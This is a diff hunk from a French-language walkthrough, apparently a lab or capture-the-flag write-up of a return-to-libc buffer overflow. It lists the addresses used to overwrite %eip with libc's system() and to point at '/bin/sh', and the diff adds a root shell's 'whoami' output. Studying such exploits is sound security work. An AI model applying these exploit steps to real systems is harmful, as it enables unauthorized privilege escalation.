@@ -673,4 +673,7 @@ On remplace avec le code sous python :
 \xb7\xe6\xb0\x60 : adresse correpondant à ce que nous allons écraser, c'est le registre %eip avec l'adresse système de la libc
 \xb7\xf8\xcc\x58 : adresse correpondant à ce que nous allons mettre sur la pile a l'adresse "/bin/sh"
 
-BIENVENUES CHEZ LES ROOTS
+# whoami
+root
+
+BIENVENUES CHEZ LES ROOTS !!!
